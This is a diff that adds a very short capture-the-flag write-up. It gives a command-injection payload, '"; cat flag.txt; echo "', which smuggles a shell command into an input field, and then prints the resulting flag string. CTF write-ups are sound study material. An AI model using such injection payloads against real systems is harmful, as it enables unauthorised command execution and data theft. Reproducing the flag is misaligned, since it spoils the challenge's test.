@@ -1,0 +1,5 @@
+1. Super ez
+2. Simply inject:
+	"; cat flag.txt; echo "
+Command function executes exactly that, and you get your resulting flag:
+30935dcac4f1e24e30b9bc8bf1b435b8
